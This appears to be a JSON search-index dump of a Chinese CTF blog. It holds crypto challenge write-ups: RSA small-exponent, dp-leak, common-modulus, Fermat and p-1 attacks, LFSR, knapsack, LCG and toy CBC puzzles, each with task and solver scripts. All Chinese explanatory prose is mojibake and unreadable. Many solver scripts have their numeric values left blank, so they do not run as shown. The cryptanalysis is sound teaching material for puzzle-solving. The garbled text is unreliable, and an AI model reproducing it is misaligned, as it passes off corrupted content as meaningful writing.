åƒå¯¹æ²¡æœ‰æ•ˆæœï¼Œä¼°è®¡æ˜¯å¤ªå°‘äº†ï¼Œè¦ç»§ç»­æ‰©å¤§èŒƒå›´ï¼Œè¿™é‡Œä¸Šè¯¾çš„æ—¶å€™è·‘äº†1h50minï¼Œåº”è¯¥æ˜¯å¤Ÿç”¨äº†ã€‚ è¿™é‡Œè°ƒäº†å‡ æ¬¡ï¼Œå·®ä¸å¤š1w2å·¦å³çš„æ•°æ®å°±å¤Ÿäº†ï¼Œä¼˜åŒ–äº†ä¸€ä¸‹ä»£ç ï¼Œ35så¯ä»¥å‡ºæ¥ import ast import time from functools import reduce from multiprocessing import Pool, cpu_count from operator import mul import gmpy2 from sage.all import CRT, Integer from Crypto.Util.number import long_to_bytes def worker_crt(nums_chunk): \"\"\"æ¯ä¸ªè¿›ç¨‹è®¡ç®—éƒ¨åˆ† CRT å’Œå¯¹åº”æ¨¡æ•°ä¹˜ç§¯\"\"\" moduli = [x[0] for x in nums_chunk] residues = [x[1] for x in nums_chunk] c = CRT(residues, moduli) n_prod = reduce(mul, moduli) return n_prod, c def recursive_crt(results): \"\"\"é€’å½’åˆ†æ²»åˆå¹¶å¤šè¿›ç¨‹ CRT ç»“æœ\"\"\" while len(results) \u003e 1: temp = [] for i in range(0, len(results), 2): if i + 1 \u003c len(results): n1, r1 = results[i] n2, r2 = results[i + 1] combined = CRT([r1, r2], [n1, n2]) temp.append((n1 * n2, combined)) else: temp.append(results[i]) results = temp return results[0] if __name__ == \"__main__\": parallel = min(16, cpu_count()) # åªè¯»ä¸€æ¬¡æ–‡ä»¶ with open(\"temp.txt\", \"r\") as f: n = [] for line in f: n += ast.literal_eval(line.strip()) n = n[:20000] print(f\"æ€»æ•°æ®é•¿åº¦: {len(n)}\") # ä¸»è¿›ç¨‹æå‰è½¬æ¢æˆ Integer å¯¹è±¡ n = [(Integer(x[0]), Integer(x[1])) for x in n] t0 = time.time() # åˆ‡åˆ†æ•°æ®å— share = len(n) // parallel chunks = [n[i * share:(i + 1) * share] for i in range(parallel)] with Pool(parallel) as pool: results = pool.map(worker_crt, chunks) # åˆ†æ²»åˆå¹¶ CRT total_modulus, total_residue = recursive_crt(results) # è®¡ç®— 65537 æ¬¡æ–¹æ ¹ m, exact = gmpy2.iroot(int(total_residue), 65537) if exact: print(\"æ•´æ•°æ ¹è®¡ç®—æˆåŠŸï¼\") print(m) print(long_to_bytes(m)) else: print(\"æ²¡æœ‰ç²¾ç¡®æ•´æ•°æ ¹ï¼\") print(f\"è€—æ—¶: {time.time() - t0:.2f} ç§’\") ","date":"2025-09-10","objectID":"/2025dawanqu/:8:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"moectf,å¼ºå£®å¯†ç äºº,crypto,wp","date":"2025-08-21","objectID":"/moeqzmmr/","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"å‰è¨€ æ‰“moectfçš„æ—¶å€™é¡ºä¾¿çœ‹äº†çœ‹è®­ç»ƒåœºçš„å¼ºå£®å¯†ç äººï¼Œé¢˜ç›®è¿˜ä¸é”™ï¼Œå†™ä¸€ä¸‹ã€‚ ","date":"2025-08-21","objectID":"/moeqzmmr/:1:0","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-08-21","objectID":"/moeqzmmr/:2:0","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"0rsa0 task.py from Crypto.Util.number import * from flag import flag assert flag[0:7] == b'moectf{' assert flag[-1:] == b'}' flag = flag[7:-1] assert len(flag) == 32 m1 = bytes_to_long(flag[0:16]) m2 = bytes_to_long(flag[16:32]) def enc1(m): p = getPrime(512) q = getPrime(512) n = p * q e = 3 c = pow(m,e,n) return n,e,c def enc2(m): p = getPrime(512) q = getPrime(512) e = 65537 d = inverse(e,(p-1)*(q-1)) n = p * q dp2 = d % (p-1) c = pow(m,e,n) return n,e,c,dp2 n1,e1,c1 = enc1(m1) n2,e2,c2,dp2 = enc2(m2) print(\"n1=\"+ str(n1)) print(\"e1=\"+ str(e1)) print(\"c1=\"+ str(c1)) print(\"n2=\"+ str(n2)) print(\"e2=\"+ str(e2)) print(\"c2=\"+ str(c2)) print(\"dp2=\"+ str(dp2)) æ€è·¯ï¼š m1å°±æ˜¯ç®€å•çš„å°eæ”»å‡»ï¼Œä¸€èˆ¬å¼€ä¸‰æ¬¡æ–¹ï¼Œå¦‚æœ$m^e\u003en$å°±è¦å°èŒƒå›´çˆ†ç ´ä¸€ä¸‹. m2å°±æ›´æ˜æ˜¾äº†ï¼Œdpæ”»å‡»broï¼Œç›´æ¥éå†eï¼Œå»çœ‹p=(dp * e - 1) // i + 1ï¼Œç„¶åç®—flagå°±è¡Œäº†. exp.py from Crypto.Util.number import * from gmpy2 import * n1= e1=3 c1= n2= e2=65537 c2= dp2= m1=iroot(c1,3)[0] print(long_to_bytes(m1)) a = getPrime(10) p = GCD(pow(a,dp2*e2,n2)-a,n2) m2 = pow(c2,dp2,p) print(long_to_bytes(m2)) flag=b'moectf{'+long_to_bytes(m1)+long_to_bytes(m2)+b'}' print(flag) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:1","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"BBBBBBBackpack task.py from Crypto.Util.number import* import random flag = xxxxx m = bytes_to_long(flag) backpack = [1] for i in range(160): backpack = backpack + [random.randrange(backpack[-1]*2,backpack[-1]*4)] print(backpack) backpack = backpack[::-1] l_list = [] for i in backpack: l_list.append(m//i) m = m % i print(l_list) print(m) æ€è·¯ï¼šè¶…åºåˆ—åŒ–èƒŒåŒ… exp.py from Crypto.Util.number import * m_list= m= m_list = list(m_list[::-1]) n = len(m) flag = 0 for i in range(n): flag += m_list[i]*m[i] print(long_to_bytes(flag)) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:2","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"BabyMultiple task.py def encode(msg,mul): c = b'' for i in msg: index = table.find(i) index_after = (index * mul) % 63 c = c + bytes.fromhex(hex(table[index_after])[2:]) return c table = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' FLAG = xxxxx assert len(table) == 63 assert FLAG[:7] == b'moectf{' assert FLAG[-1:] == b'}' Mul = 58 msg = FLAG[7:-1] c = encode(msg,Mul) print(c) #b'g3AfJPOfHPOJFfJuf_AYux1JFx39' æ€è·¯ï¼ši*58 mod 63åŠ å¯†çš„ï¼Œé€†å›å»å­¦ exp.py table = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' c = b'g3AfJPOfHPOJFfJuf_AYux1JFx39' Mul = 58 mod = len(table) Mul_inv = pow(Mul, -1, mod) def decode(cipher_text, mul_inv): msg = b'' for i_byte in cipher_text: index_after = table.find(i_byte) original_index = (index_after * mul_inv) % mod msg += table[original_index:original_index+1] return msg decrypted_msg = decode(c, Mul_inv) FLAG = b'moectf{' + decrypted_msg + b'}' print(FLAG) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:3","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"LazyRSA task.py from Crypto.Util.number import* p = getPrime(512) q = getPrime(512) n = p*q e = 0x10001 flag = xxx m = bytes_to_long(flag) c = pow(m,e,n) print(\"p = \" , p) print(\"q = \" , q) print(\"c = \" , c) æ€è·¯ï¼šç›´æ¥ç®—å°±è¡Œ exp.py from Crypto.Util.number import * p = q = c = print(long_to_bytes(pow(c,inverse(65537,(p-1)*(q-1)),p*q))) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:4","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"Little_FSR task.py import random import string from Crypto.Util.number import * from gmpy2 import * from secret import FLAG, key assert FLAG[:7] == b'moectf{' assert FLAG[-1:]== b'}' table = string.ascii_letters+string.digits+string.punctuation for _ in range(50-len(FLAG)): FLAG += random.choice(table).encode() assert len(FLAG) == 50 assert len(key) == 5 class LFSR: def __init__(self): self.data = list(map(int,list(bin(bytes_to_long(FLAG))[2:].rjust(400,'0')))) for _ in range(2022): self.cycle() def cycle(self): bit = self.data[0] new = 0 for i in key: new ^= self.data[i] self.data = self.data[1:] + [new] return bit ILOVEMOECTF = LFSR() for _ in range(2022): print(ILOVEMOECTF.cycle(), end='') æ€è·¯ï¼šè¡¨é¢FSRå®é™…æ•ˆæœå’ŒLFSRå·®ä¸å¤š class lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init \u003c\u003c 1) \u0026 self.lengthmask i = self.init \u0026 self.mask \u0026 self.lengthmask output = 0 while i != 0: output ^= (i \u0026 1) i = i \u003e\u003e 1 nextdata ^= output self.init = nextdata return output åŠ å¯†æ–¹å¼æ˜¯ $$ newbit = data_{key[0]}\\bigoplus data_{key[1]}\\bigoplus \\cdots \\bigoplus data_{key[m]} $$æŒ‰ç†æ¥è¯´å¯ä»¥çˆ†ç ´ï¼Ÿæ—¶é—´å¤ªé•¿äº†ï¼Œæˆ‘ä»¬è¿™é‡Œæ±‚è§£çº¿æ€§åŒä½™æ–¹ç¨‹ç»„ from Crypto.Util.number import * data = b = list(data[400:800]) B =vector(Zmod(2),b) mt = matrix(Zmod(2),0,400) for i in range(400): mt = mt.stack(vector(Zmod(2),list(data[i:i+400]))) x = mt \\ B key = [] for index,i in enumerate(x): if i == 1: key.append(index) print(key) # [8, 23, 114, 211, 360] Len = 400 - key[0] m = list(map(int,data[:Len])) for _ in range(2022): c = 0 for t in key: c = c^^m[t-key[0]-1] m = [c] + m[:Len-1] flag = ''.join(str(i) for i in m) print(long_to_bytes(int(flag,2))) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:5","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"MiniMiniBackPack task.py from gmpy2 import * from Crypto.Util.number import * import random from FLAG import flag def gen_key(size): s = 1000 key = [] for _ in range(size): a = random.randint(s + 1, 2 * s) assert a \u003e sum(key) key.append(a) s += a return key m = bytes_to_long(flag) L = len(bin(m)[2:]) key = gen_key(L) c = 0 for i in range(L): c += key[i]**(m\u00261) m \u003e\u003e= 1 print(key) print(c) æ€è·¯ï¼šè´ªå¿ƒæ±‚è§£å³å¯ï¼šä»å¤§åˆ°å°ï¼Œå¦‚æœå¯ä»¥å‡å»å½“å‰å¤§æ•°ï¼Œåˆ™å‡å»ï¼Œå¹¶ä¸”å¯¹åº”äºŒè¿›åˆ¶æ˜æ–‡ä¸º1 exp.py from Crypto.Util.number import * key=[] c = m = '' for i in reversed(key): if c \u003e i: m += '1' c -= i else: m += '0' c -= 1 flag = long_to_bytes(int(m,2)) print(flag) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:6","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"NumberTheory-FeeeeeMa task.py import gmpy2 from Crypto.Util.number import * p = getPrime(2048) q = gmpy2.next_prime(p) for i in range(3600): if i%100 ==0: print(i) q = gmpy2.next_prime(q) n = p * q e = 0x10001 flag = xxx m = bytes_to_long(flag) c = pow(m,e,n) print(c) print(n) æ€è·¯ï¼šè‚‰çœ¼å¯è§çš„ä¸¤ä¸ªå€¼ç¦»å¾—è¿‘ï¼Œè¿™é‡Œç›´æ¥irootå¼€æ–¹ï¼Œå‘ç°ç¦»çš„æœ‰ç‚¹è¿œï¼Œè´¹é©¬åˆ†è§£æ¢­å“ˆ exp.py from Crypto.Util.number import * from gmpy2 import * c= n= e=0x10001 def fermat_factor(n): a = gmpy2.isqrt(n) + 1 while True: b2 = gmpy2.square(a) - n if gmpy2.is_square(b2): b = gmpy2.isqrt(b2) p = a - b q = a + b return p, q a += 1 def solve(): p, q = fermat_factor(n) phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) m = pow(c, d, n) flag = long_to_bytes(m) print(flag) if __name__ == '__main__': solve() ","date":"2025-08-21","objectID":"/moeqzmmr/:2:7","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"NumberTheory-MyGrandson task.py import random from Crypto.Util.number import * prime_list = [] while len(prime_list) != 10: p = getPrime(512) if p not in prime_list: prime_list.append(p) n_list = [] while len(prime_list) != 0 : p = random.choice(prime_list) prime_list.remove(p) q = random.choice(prime_list) prime_list.remove(q) n = p * q n_list.append(n) e = 0x3 flag = xxxx m = bytes_to_long(flag) c_list = [] for i in range(5): c_list.append(pow(m,e,n_list[i])) print(n_list) print(c_list) æ€è·¯ï¼šç»å…¸crté—®é¢˜ï¼Œcrtæ±‚è§£åå¼€ä¸‰æ¬¡æ–¹å³å¯ from Crypto.Util.number import * from gmpy2 import * from sage.all import * n_list= c_list= e=3 m_cubed = crt(c_list, n_list) m=iroot(m_cubed,e)[0] print(long_to_bytes(m)) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:8","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"NumberTheory-Powwwwwer task.py from Crypto.Util.number import * p = getPrime(512) q = getPrime(512) flag = xxxxx m = bytes_to_long(flag) n = p * q e1 = 0x114514 e2 = 11451401 c1 = pow(m,e1,n) c2 = pow(m,e2,n) print(c1) print(c2) print(n) æ€è·¯ï¼šç»å…¸çš„å…±æ¨¡æ”»å‡» $$ c_1=m^{e_1} \\mod n \\\\ c_2=m^{e_2} \\mod n \\\\ ç”±æ¬§å‡ é‡Œå¾—ç®—æ³•å¯çŸ¥e_1x+e_2y=1 \\\\ é‚£ä¹ˆ c^{x}\\times c^{y}=m^{xe_1+ye_2}=m \\mod n $$exp.py from Crypto.Util.number import* import gmpy2 c1= c2= n= e1 = 0x114514 e2 = 11451401 r,s1,s2 = gmpy2.gcdext(e1, e2) m = (pow(c1,s1,n)*pow(c2,s2,n)) % n print(long_to_bytes(m)) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:9","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"PRintNewG task.py import random from Crypto.Util.number import* from FLAG import flag class PRintNewG: def __init__(self,seed): self.state = seed self.a = random.randint(2**256,2**257) self.b = random.randint(2**256,2**257) if self.b \u003e self.a: self.b = self.b - self.a self.n = getPrime(257) def NewG(self): self.state = (self.a * self.state + self.b) % self.n print(self.state) PrintNewG = PRintNewG(bytes_to_long(flag)) print(PrintNewG.n) PrintNewG.NewG() PrintNewG.NewG() PrintNewG.NewG() æ€è·¯ï¼šå°±æ˜¯LCGï¼ŒçŸ¥é“nï¼ŒçŸ¥é“è¿ç»­ä¸‰æ¬¡è¾“å‡ºï¼Œè¿™é‡Œç›´æ¥æ±‚è§£ exp.py from Crypto.Util.number import * n = 164955381960104851576442781839629371483790790743830073857213053104860144345367 s1 = 67066424717605861916529090048670931008913194546199003522357504998012803616537 s2 = 14585402872351563180055857554749250191721167730349724393021149201170995608751 s3 = 68393939370424772490169906192546208899639826391163845848999554903218827210979 def solve_lcg(): s2_minus_s1_inv = pow(s2 - s1, -1, n) a = ((s3 - s2) * s2_minus_s1_inv) % n b = (s2 - a * s1) % n a_inv = pow(a, -1, n) s0 = ((s1 - b) * a_inv) % n flag = long_to_bytes(s0) print(flag) if __name__ == '__main__': solve_lcg() ","date":"2025-08-21","objectID":"/moeqzmmr/:2:10","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"Signin task.py from Crypto.Util.number import * from secret import flag m=bytes_to_long(flag) p=getPrime(512) q=getPrime(512) print('p=',p) print('q=',q) n=p*q e=65537 c=pow(m,e,n) print('c=',c) æ€è·¯ï¼šæœ‰ä¸ªå°å‘ï¼Œqå’Œeä¸äº’ç´ çš„ exp.py from Crypto.Util.number import * p= q= c= e=65537 print(GCD(e,p-1)) print(long_to_bytes(pow(c,inverse(e,p-1),p))) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:11","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"Weird_E_Revenge task.py from Crypto.Util.number import * import random from secret import flag table='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' pad=100-len(flag) for i in range(pad): flag+=random.choice(table).encode() e=343284449 m=bytes_to_long(flag) assert m\u003e(1\u003c\u003c512) assert m\u003c(1\u003c\u003c1024) p=getPrime(512) q=getPrime(512) r=getPrime(512) print('p=',p) print('q=',q) print('r=',r) n1=p*q n2=q*r c1=pow(m,e,n1) c2=pow(m,e,n2) print('c1=',c1) print('c2=',c2) æ€è·¯ï¼šåº”è¯¥éƒ½å·®ä¸å¤šï¼Œm1=m mod p,m2=m mod r $$ m=m_1\\cdot r\\cdot inv_1+m_2\\cdot p \\cdot inv_2 \\\\ å…¶ä¸­ inv_1\\equiv r^{-1}(mod\\ p),inv_2\\equiv p^{-1}(mod\\ r) $$è¿˜æœ‰ä¸€ä¸ªæ€è·¯(åœ¨githubçœ‹è§çš„) $x\\equiv c1(\\mod n1)$ $x\\equiv c2(\\mod n2)$ è¿™é‡Œçš„xè¡¨ç¤ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªå¯†æ–‡éƒ½æ˜¯ç”± $m^e$ æ¨¡å„è‡ªçš„nå¾—åˆ°çš„ï¼Œæ‰€ä»¥xå°±æ˜¯ $m^e$ ã€‚crtæ±‚è§£å°±å¯ä»¥å¾—åˆ° $m^e$ çš„ä¸€ä¸ªç‰¹è§£ã€‚ ä½†æ˜¯æ±‚å®Œè¿˜æ˜¯æœ‰é—®é¢˜ã€‚eå€¼æ²¡æœ‰æ”¹å˜ï¼Œè¿˜æ˜¯é‚£ä¹ˆå¤§ï¼Œæ„å‘³ç€æ— æ³•çˆ†ç ´æˆ–è€…æœ‰é™åŸŸå¼€æ ¹ã€‚å¿…é¡»è¦æ‰¾åˆ°dï¼Œä»¬æŠŠæ¨¡æ•°æ¢æˆp*rã€‚ $result\\equiv x=m^e%p(\\mod p)$ $result\\equiv x=m^e%r(\\mod r)$ æŠŠqå»æ‰ï¼Œæ‹¿åˆšåˆšæ±‚å‡ºçš„ç‰¹è§£å†æ¬¡æ„é€ åŒä½™æ–¹ç¨‹ç»„ã€‚è¿™ä¸ªåŒä½™æ–¹ç¨‹ç»„æ±‚å‡ºæ¥çš„ç‰¹è§£ $result\\equiv m^e (\\mod p*r)$ ã€‚ å¯ä»¥è¿™ä¹ˆæƒ³ï¼Œè®¾ $a\\equiv m^e%p(\\mod p),b\\equiv m^e%r(\\mod r)$ ï¼Œé‚£ä¹ˆa*bå¿…å®šæ˜¯è¿™ä¸ªåŒä½™æ–¹ç¨‹ç»„çš„è§£ä¹‹ä¸€ã€‚ $a=k1\\times p+m^e,b=k2\\times r+m^e$ ï¼Œ é‚£ä¹ˆ $ab=(k1p+m^e)\\times (k2r+m^e)=k1\\times k2\\times pr+k1pm^e+k2rm^e+m^a,a=2e$ ã€‚ $k1\\times k2\\times pr+k1pm^e+k2rm^e$ è¿™æ®µæ¨¡prä½™æ•°è‚¯å®šæ˜¯0 exp.py from Crypto.Util.number import * from sympy.ntheory.modular import crt p= q= r= c1= c2= e=343284449 n1=p*q n2=q*r n3=p*r m=crt([n1,n2],[c1,c2])[0] m1=m%p m3=m%r m=crt([p,r],[m1,m3])[0] d=inverse(e,(p-1)*(r-1)) print(long_to_bytes(pow(m,d,n3))) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:12","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"beginOfCrypto task.py import math flag = xxx data = list(map(ord,flag)) cip = [] for i in range(len(data)): cip.append(math.e**data[i]) print(cip) æ€è·¯ï¼šå°±æ˜¯æ¬¡æ–¹äº†ï¼Œç›´æ¥logæ±‚è§£ exp.py import math cip = [] flag = \"\" for c in cip: ascii_val = math.log(c) rounded_ascii = round(ascii_val) flag += chr(rounded_ascii) print(flag) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:13","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"ezRSA task.py from Crypto.Util.number import * flag = bytes_to_long(xxxxx) p,q,r = getPrime(2048),getPrime(2048),getPrime(2048) n = p * q * r e = 0x10001 s = getPrime(300) print(160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 +1) gift = (pow(p, (q-1)*(r-1)*q*r, (q*r) ** 3)* pow(q*r+1, q, (q*r)**3)) % (q*r)**3 print(gift) phi = (p-1)*(q-1)*(r-1) d = inverse(e,phi) k = (p-s)*d enc = pow(flag,e,n) print(n) print(k) print(enc) æ€è·¯ï¼šå”è®ºé¢˜ï¼Œgiftæ¨å¯¼äº†ä¸€å †ï¼Œæ­£ç»æ–¹æ³•æ˜¯å…ˆæ‹¿åˆ°s $$ 3^{ek}\\mod n - 3^{1-s}\\mod n =3^{p-s}\\mod n -3^{1-s}\\mod n $$å¯ä»¥æ‹¿åˆ°pï¼Œæ¥ç€æ±‚qrï¼Œè¿™é‡Œç¨å¾®æ¨ä¸€ä¸‹gift mod q^2*r^2ï¼Œ $$ gift = p^{q(q-1)r(r-1)}(qr+1)^q = (qr+1)^q=(q^2r+1) \\mod (qr)^2 $$é‚£ä¹ˆå°±å¯ä»¥æ±‚è§£å‡ºæ¥äº† ä¸æ­£ç»çš„æ–¹æ³•ï¼šgift-1å’Œnåšgcdå³å¯ exp.py from Crypto.Util.number import * gift= e=65537 n= enc= qr=GCD(gift-1,n) p=n//qr print(long_to_bytes(pow(enc,inverse(e,p-1),p))) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:14","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"ez_cbc task.py from Crypto.Util.number import * import random from secret import flag IV = bytes_to_long(b'cbc!') K = random.randrange(1,1\u003c\u003c30) assert flag[:7] == b'moectf{' assert flag[-1:] == b'}' block_length = 4 flag = flag + ((block_length - len(flag) % block_length) % block_length) * b'\\x00' plain_block = [flag[block_length * i: block_length * (i + 1)] for i in range(len(flag) // block_length)] c = [] c0 = (IV ^ bytes_to_long(plain_block[0])) ^ K c.append(c0) for i in range(len(plain_block)-1): c.append(c[i] ^ bytes_to_long(plain_block[i+1]) ^ K) print(c) exp.py from Crypto.Util.number import * c = [] IV = bytes_to_long(b'cbc!') p0_long = bytes_to_long(b'moec') plain_longs = [p0_long] p1_long = p0_long ^ IV ^ c[1] plain_longs.append(p1_long) for i in range(1, len(c) - 1): pi = plain_longs[i] ci_minus_1 = c[i - 1] ci_plus_1 = c[i + 1] pi_plus_1 = pi ^ ci_minus_1 ^ ci_plus_1 plain_longs.append(pi_plus_1) padded_flag = b'' for p_long in plain_longs: padded_flag += long_to_bytes(p_long, 4) flag = padded_flag[:padded_flag.rfind(b'}') + 1] print(flag.decode()) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:15","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"smooth task.py from Crypto.Util.number import sieve_base,isPrime,getPrime import random from secret import flag def get_vulnerable_prime(): p=2 while True: for i in range(136): smallp=random.choice(sieve_base) p*=smallp if isPrime(p+1): return p+1 P=get_vulnerable_prime() Q=getPrime(2048) N=P*Q e=0x10001 for i in range(1,P-1729): flag=flag*i%P c=pow(flag,e,N) print(\"c=\",hex(c)) print(\"N=\",hex(N)) æ€è·¯ï¼šæ˜æ˜¾çš„p-1å…‰æ»‘ï¼Œå¯ä»¥åˆ†è§£å‡ºæ¥pqï¼Œç„¶åæœ‰ä¸ªWilsonå®šç†ï¼Œ$(p-1)! \\equiv -1 \\pmod p$ exp.py from Crypto.Util.number import * from gmpy2 import * c= N= def p_1_smooth(N): a = 2;n = 2 while True: a = pow(a, n, N) res = GCD(a-1, N) if res != 1 and res != N: return res n += 1 p=p_1_smooth(N) q=N//p phi=(p-1)*(q-1) d=inverse(0x10001,phi) m=pow(c,d,N) for i in range(p-1729,p): m=m*i%p m=(-m)%p print(long_to_bytes(m)) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:16","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"ä¸€æ¬¡å°±å¥½ task.py from Crypto.Util.strxor import strxor from Crypto.Util.number import * from gmpy2 import powmod,next_prime from FLAG import flag import codecs c = b'Just once,I will accompany you to see the world' flag = flag.ljust(len(c),'#') key = strxor(flag.encode(), c) m = bytes_to_long(key) p = getPrime(512) q = next_prime(p) N = p*q e = 0x10001 gift = powmod(m, e, N) print(gift) print(N) æ€è·¯ï¼šå…ˆå¼€æ–¹æ±‚å‡ºpqï¼Œæœ€åæœ‰ä¸ªxor exp.py from Crypto.Util.number import * from Crypto.Util.strxor import strxor from gmpy2 import * gift = N = e=65537 c = b'Just once,I will accompany you to see the world' p=iroot(N,2)[0] p=next_prime(p) q=N//p assert p*q==N flag=long_to_bytes(pow(gift,inverse(e,(p-1)*(q-1)),N),len(c)) flag=strxor(flag,c) print(flag) ","date":"2025-08-21","objectID":"/moeqzmmr/:2:17","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"ä¸æ­¢ä¸€æ¬¡ è¿™ä¸ªæ¯”è¾ƒè°œè¯­äººï¼Œæˆ‘ä»¬çŸ¥é“flagå¤´æ˜¯ä»€ä¹ˆï¼ŒåŠ å¯†ä¸»è¦æ˜¯ä¸€ä¸ªkeyå¯¹ä¸åŒçš„å¯†æ–‡åŠ å¯†ï¼Œåé¢å‘ç°æ¯ä¸ªéƒ½å·®ä¸å¤šï¼Œçˆ†ç ´ä¸€ä¸‹å°±è¡Œäº† exp.py from Crypto.Util.strxor import strxor from string import printable A = bytes.fromhex(\"\") B = bytes.fromhex(\"\") known = \"moectf{\" flag_len = 36 while len(known) \u003c flag_len: for c in printable: flag = known + c + \"a\"*(flag_len - 1 - len(known)) flag = flag.encode() a = strxor(A,flag) b = strxor(B,flag) if a[len(known)] == b[len(known)-1]: known+=c break ","date":"2025-08-21","objectID":"/moeqzmmr/:2:18","tags":["crypto"],"title":"Moectf å¼ºå£®å¯†ç äººéƒ¨åˆ†é¢˜è§£","uri":"/moeqzmmr/"},{"categories":["CTF"],"content":"é©¬é”¤å£³s task.py from sage.all import * from Crypto.Util.number import * from secret import flag def _N2M_(num,wid): mat = [] num = bin(num)[2:].rjust(wid*wid,'0') for i in range(wid): TMP = [] for j in range(wid): TMP.append(int(num[i*wid + j])) mat.append(TMP) return mat def _T_(mat,wid): new_mat = [] for i in range(wid): TMP = [] for j in range(wid): TMP.append(int(mat[j][i])) new_mat.append(TMP) return new_mat def _GenKeyM_(wid): Prime_bits = 256 primes = [[getPrime(Prime_bits) for i in range(wid)] for j in range(wid)] return primes if __name__ == \"__main__\": wid = 17 m = bytes_to_long(flag) m = _T_(_N2M_(m,wid),wid) m = Matrix(ZZ,m) key = _GenKeyM_(wid) c = m * Matrix(ZZ,key) f = open(r'/output','w') bigMOD = 2**512 A = 0x10001 B = 12138 KEY = A * Matrix(Zmod(bigMOD),key) + B f.write(\"cipher : \\n\" + str(c) + '\\nKEY :\\n' + str(KEY)) f.close() æ€è·¯ï¼šå…ˆå¯¹æ¶ˆæ¯è¿›è¡Œ01åŠ å¯†ï¼ŒæˆçŸ©é˜µï¼Œç„¶åæˆ17x17çš„çŸ©é˜µï¼Œç„¶åçŸ©é˜µä¹˜æ³•ï¼Œç„¶åç»™äº†åŠ å¯†åçš„Kï¼Œè¿™é‡ŒKå¯ä»¥ç›´æ¥è®¡ç®—ï¼Œç„¶åè§£å¯†c exp.py from sage.all import * from Crypto.Util.number import* Key = K = Matrix(Zmod(2**512),Key) K = ((K-12138)/0x10001) NEW_K = Matrix(ZZ,K) C = C = Matrix(ZZ,C) m = NEW_K.solve_left(C) M = ''.join(str(i) for i in ((m.T).list())) print(long_to_bytes(int(M,2))) 